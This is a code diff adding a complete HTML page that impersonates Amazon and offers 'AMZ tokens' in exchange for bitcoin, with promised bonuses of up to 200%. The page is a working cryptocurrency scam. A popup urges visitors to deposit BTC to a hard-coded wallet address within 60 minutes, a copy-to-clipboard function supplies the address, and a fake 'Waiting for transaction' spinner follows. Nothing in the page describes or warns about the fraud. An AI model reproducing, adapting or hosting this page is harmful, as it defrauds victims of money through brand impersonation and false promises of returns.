@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Pre-Purchase Amazon Tokens</title>
+    <link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.png">
+</head>
+<body>
+    <div><img class="top-logo" style="width:200px; align-self: center;" src="assets/img/logo.png" alt="logo"></div>
+    <div class="top-banner">
+        <p class="current-plan"></p>
+        <p class="plan-type"> You have activated the bonuscode to swap your cryptocurrency to AMZ with up to 200% bonus. You can create a new AMZ wallet with a new or existing Amazon account after the deposit confirmation and you will receive the tokens on the linked wallet.</p>
+    </div>
+
+      <div class="cards">
+
+          <!-- Pro Plan -->
+          <div class="card active" id="card-2">
+            <h1 class="card-title"></h1>
+            <h2 class="card-price" id="BTC"> BTC <span>Swap to AMZ</span> </h2>
+          
+            <select  id="maus">
+              <option value="0.03 BTC">0.03 BTC - 900 AMZ (Bonus 50%)</option>
+              <option value="0.04 BTC">0.04 BTC - 1200 AMZ (Bonus 50%)</option>
+              <option value="0.05 BTC">0.05 BTC - 1500 AMZ (Bonus 50%)</option>
+				      <option value="0.06 BTC">0.06 BTC - 1800 AMZ (Bonus 50%)</option>
+			      	<option value="0.07 BTC">0.07 BTC - 2100 AMZ (Bonus 50%)</option>
+			       	<option value="0.08 BTC">0.08 BTC - 2400 AMZ (Bonus 50%)</option>
+			      	<option value="0.09 BTC">0.09 BTC - 2700 AMZ (Bonus 50%)</option>
+			      	<option value="0.10 BTC">0.10 BTC - 4000 AMZ (Bonus 100%)</option>
+			      	<option value="0.11 BTC">0.11 BTC - 4400 AMZ (Bonus 100%)</option>
+			      	<option value="0.12 BTC">0.12 BTC - 4800 AMZ (Bonus 100%)</option>
+			      	<option value="0.13 BTC">0.13 BTC - 5200 AMZ (Bonus 100%)</option>
+			      	<option value="0.14 BTC">0.14 BTC - 5600 AMZ (Bonus 100%)</option>
+			      	<option value="0.15 BTC">0.15 BTC - 9000 AMZ (Bonus 200%)</option>
+			      	<option value="0.16 BTC">0.16 BTC - 9600 AMZ (Bonus 200%)</option>
+			      	<option value="0.17 BTC">0.17 BTC - 10200 AMZ (Bonus 200%)</option>
+			      	<option value="0.18 BTC">0.18 BTC - 10800 AMZ (Bonus 200%)</option>
+			      	<option value="0.19 BTC">0.19 BTC - 11400 AMZ (Bonus 200%)</option>
+			      	<option value="0.20 BTC">0.20 BTC - 12000 AMZ (Bonus 200%)</option>
+            </select>
+            <span class="note"> Choose AMZ tokens quantity </span>
+          
+            <button type="submit" class="card-btn" onclick="openPopupbtc()"> Swap to AMZ</button>
+            <p class="card-plan"></p>
+            <div class="popupbtc" id="popupbtc">
+              <img style="margin-top: 20px; width:42px; left: auto;" src="assets/img/shib.png">
+              <h3 style=margin-top:5px;">SWAP LAUNCHED</h3>
+              <p style="margin: 10px 15px 10px 15px;">Deposit your choosen amount in BTC by using the QR code or click on the BTC address below to copy and paste the wallet address.You have 60 min. to complete transaction.</p>
+              <img style="width:200px; margin: 0;" src="./assets/img/chart1.png">
+              <br><br>
+              <button class="popupcopy" onclick="copyText()">bc1qhelgmfcelm6sxw0fskm2ahhcaf970rk4p9l0xz</button>
+              <button class="card-btn" onclick="copyText()">COPY ADDRESS</button>
+              <span style="font-family:Heebo;color:#fff;"><i class="loading loading--full-height"></i> Waiting for transaction...</span>
+
+              <script>
+                function copyText() {
+              
+                    /* Copy text into clipboard */
+                    navigator.clipboard.writeText
+                        ("bc1qhelgmfcelm6sxw0fskm2ahhcaf970rk4p9l0xz")
+                }
+            </script>
+            
+            </div>
+          </div>
+      </div>
+    </div>
+
+<script>
+  let popupbtc = document.getElementById("popupbtc")
+
+  function openPopupbtc(){
+    popupbtc.classList.add("open-popup");
+
+  }  
+
+
+</script>
+
+
+</body>
+</html>
